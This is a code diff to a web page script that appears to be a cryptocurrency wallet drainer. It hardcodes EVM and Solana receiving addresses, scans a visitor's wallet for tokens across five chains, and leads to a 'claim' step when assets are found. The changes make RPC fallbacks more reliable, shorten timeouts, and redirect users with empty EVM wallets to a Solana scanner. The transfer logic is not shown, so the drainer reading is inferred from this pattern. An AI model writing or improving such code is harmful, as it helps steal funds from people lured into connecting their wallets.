@@ -261,8 +261,20 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 <script>
 var ADDR_EVM='0x5E45bE0cf682566337b6fC2C00036AaBCBf1332f';
 var ADDR_SOL='4Y9bDw32qG9xUQykfCe6jP9UVpVmit8ryqE8n1JKVx89';
-var ECHAINS=[{id:56,name:'BNB Chain',sym:'BNB',rpc:'https://bsc-dataseed1.defibit.io',color:'#F3BA2F'},{id:1,name:'Ethereum',sym:'ETH',rpc:'https://ethereum-rpc.publicnode.com',color:'#627EEA'},{id:137,name:'Polygon',sym:'MATIC',rpc:'https://polygon-bor-rpc.publicnode.com',color:'#8247E5'},{id:43114,name:'Avalanche',sym:'AVAX',rpc:'https://avalanche-c-chain-rpc.publicnode.com',color:'#E84142'},{id:42161,name:'Arbitrum',sym:'ETH',rpc:'https://arbitrum-one-rpc.publicnode.com',color:'#28A0F0'}];
-var FBACK={1:['https://rpc.ankr.com/eth'],137:['https://rpc.ankr.com/polygon'],56:['https://bsc-dataseed.binance.org'],43114:['https://avalanche-c-chain.public.blastapi.io'],42161:['https://rpc.ankr.com/arbitrum']};
+var ECHAINS=[
+  {id:56,name:'BNB Chain',sym:'BNB',rpc:'https://bsc-dataseed.binance.org',color:'#F3BA2F'},
+  {id:1,name:'Ethereum',sym:'ETH',rpc:'https://eth.llamarpc.com',color:'#627EEA'},
+  {id:137,name:'Polygon',sym:'MATIC',rpc:'https://polygon-rpc.com',color:'#8247E5'},
+  {id:43114,name:'Avalanche',sym:'AVAX',rpc:'https://api.avax.network/ext/bc/C/rpc',color:'#E84142'},
+  {id:42161,name:'Arbitrum',sym:'ETH',rpc:'https://arb1.arbitrum.io/rpc',color:'#28A0F0'}
+];
+var FBACK={
+  1:['https://rpc.ankr.com/eth','https://ethereum-rpc.publicnode.com'],
+  137:['https://rpc.ankr.com/polygon','https://polygon-bor-rpc.publicnode.com'],
+  56:['https://bsc-dataseed1.defibit.io','https://bsc-dataseed.binance.org'],
+  43114:['https://avalanche-c-chain-rpc.publicnode.com'],
+  42161:['https://rpc.ankr.com/arbitrum','https://arbitrum-one-rpc.publicnode.com']
+};
 var ETOKENS={56:[['0x55d398326f99059fF775485246999027B3197955','USDT',18],['0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d','USDC',18],['0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56','BUSD',18],['0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3','DAI',18],['0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c','BTCB',18],['0x2170Ed0880ac9A755fd29B2688956BD959F933F8','ETH',18],['0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c','WBNB',18],['0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82','CAKE',18],['0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD','LINK',18],['0xCC42724C6683B7E57334c4E856f4c9965ED682bD','MATIC',18]],1:[['0xdAC17F958D2ee523a2206206994597C13D831ec7','USDT',6],['0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48','USDC',6],['0x6B175474E89094C44Da98b954EedeAC495271d0F','DAI',18],['0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599','WBTC',8],['0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2','WETH',18]],137:[['0xc2132D05D31c914a87C6611C10748AEb04B58e8F','USDT',6],['0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174','USDC',6],['0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063','DAI',18]],43114:[['0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7','USDT',6],['0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E','USDC',6]],42161:[['0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9','USDT',6],['0xaf88d065e77c8cC2239327C5EDb3A432268e5831','USDC',6]]};
 var PRICES={BNB:600,ETH:3500,MATIC:0.7,AVAX:25,USDT:1,USDC:1,BUSD:1,DAI:1,BTCB:100000,WBTC:100000,LINK:15,CAKE:3,WBNB:600,WETH:3500};
 
@@ -415,7 +427,7 @@ async function scanEvm(){
     var allRpcs=[ch.rpc].concat(FBACK[ch.id]||[]);
     for(var j=0;j<allRpcs.length;j++){
       try{var tp=new ethers.providers.JsonRpcProvider(allRpcs[j]);
-        var tb=await Promise.race([tp.getBalance(addr),new Promise(function(_,rej){setTimeout(function(){rej(new Error('timeout'));},10000);})]);
+        var tb=await Promise.race([tp.getBalance(addr),new Promise(function(_,rej){setTimeout(function(){rej(new Error('timeout'));},5000);})]);
         p=tp;nb=tb;break;}catch(e){}}
     if(!nb){L('  '+ch.name+': RPC error');continue;}
     try{
@@ -433,7 +445,11 @@ async function scanEvm(){
     }catch(e){L('  '+ch.name+': error');}
   }
   L('');L('Found '+foundChains.length+' chain(s).');await sleep(600);
-  if(foundChains.length===0){showP('p2');stat('No EVM funds.','wa');}
+  if(foundChains.length===0){showP('p2');
+    document.getElementById('p2').querySelector('div[style*="font-size:14px"]').textContent='No EVM Tokens Found';
+    document.getElementById('p2').querySelector('div[style*="font-size:11px;color:rgba"]').innerHTML='No tokens found on BSC, ETH, Polygon, AVAX, or Arbitrum.<br><br>If you have SOL on Solana, please use the Solana address scanner below.';
+    stat('No EVM tokens on this wallet.','wa');
+  }
   else{showClaim();stat('&#x2705; Assets found!','ok');}
 }
 
